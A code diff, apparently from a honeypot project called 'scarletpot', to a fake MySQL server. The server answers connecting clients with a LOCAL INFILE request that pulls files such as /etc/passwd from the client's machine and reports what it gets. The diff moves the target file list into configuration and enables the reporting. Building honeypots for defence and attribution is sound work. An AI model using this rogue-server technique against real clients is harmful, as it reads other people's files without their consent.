@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"github.com/panjf2000/ants"
 	"net"
+	"scarletpot/report"
+	"scarletpot/utils/conf"
 	"scarletpot/utils/log"
 	"scarletpot/utils/pool"
 	"strings"
@@ -36,6 +38,8 @@ var wg sync.WaitGroup
 var poolX *ants.Pool
 
 var ip string
+var fileNames []string
+var filename string
 
 func Start() {
 	// 开启协程池 每次处理10个协程
@@ -46,7 +50,8 @@ func Start() {
 	listener, _ := net.ListenTCP("tcp", serverAddr)
 
 	// 文件列表 需要在配置文件中，暂时先放在这里 多个文件以逗号隔开
-	fileNames := strings.Split("/etc/passwd,/etc/hosts", ",")
+	fileNames = strings.Split(conf.GetBaseConfig().Mysql.File, ",")
+	filename = fileNames[0]
 
 	for {
 		// 添加一个任务计数
@@ -63,14 +68,14 @@ func Start() {
 			ip = arr[0]
 
 			//这里记录每个客户端连接的次数，实现获取多个文件
-			_, ok := recordClient[ip]
-			if ok {
-				if recordClient[ip] < len(fileNames)-1 {
-					recordClient[ip] += 1
-				}
-			} else {
-				recordClient[ip] = 0
-			}
+			//_, ok := recordClient[ip]
+			//if ok {
+			//	if recordClient[ip] < len(fileNames)-1 {
+			//		recordClient[ip] += 1
+			//	}
+			//} else {
+			//	recordClient[ip] = 0
+			//}
 
 			go connectionHandler(conn)
 		})
@@ -83,8 +88,8 @@ func connectionHandler(conn net.Conn) {
 	defer conn.Close()
 	var ibuf = make([]byte, bufLength)
 
-	connFrom := conn.RemoteAddr().String()
-	fmt.Println("收到来自", connFrom, "的连接")
+	//connFrom := conn.RemoteAddr().String()
+	//fmt.Println("收到来自", connFrom, "的连接")
 	_, err := conn.Write(handshakePack)
 	if err != nil {
 		log.Err("zh-CN", "握手包发送失败..")
@@ -104,8 +109,8 @@ func connectionHandler(conn net.Conn) {
 		log.Err("zh-CN", "ok包发送失败")
 	}
 	_, err = conn.Read(ibuf[0 : bufLength-1])
-	getFileData := []byte{byte(len("/etc/test.txt") + 1), 0x00, 0x00, 0x01, 0xfb}
-	getFileData = append(getFileData, "/etc/test.txt"...)
+	getFileData := []byte{byte(len(filename) + 1), 0x00, 0x00, 0x01, 0xfb}
+	getFileData = append(getFileData, filename...)
 
 	_, err = conn.Write(getFileData)
 	getContent(conn)
@@ -141,15 +146,15 @@ func getContent(conn net.Conn) {
 			totalReadLength += length
 			if totalReadLength == totalDataLength {
 				// 上报信息至蜜罐
-				//go report.ReportMysql("MySQL", ip, "", "/etc/test.txt\n"+content.String())
+				go report.ReportMysql("MySQL", ip, "", filename+"\n"+content.String())
 				fmt.Println(content.String())
 				_, _ = conn.Write(okPack)
 			}
 		case syscall.EAGAIN: // try again
 			continue
 		default:
-			arr := strings.Split(conn.RemoteAddr().String(), ":")
-			log.Warn("zh-CN", "Mysql "+arr[0]+" 已经关闭连接")
+			//arr := strings.Split(conn.RemoteAddr().String(), ":")
+			//log.Warn("zh-CN", "Mysql "+arr[0]+" 已经关闭连接")
 			wg.Done()
 			return
 		}
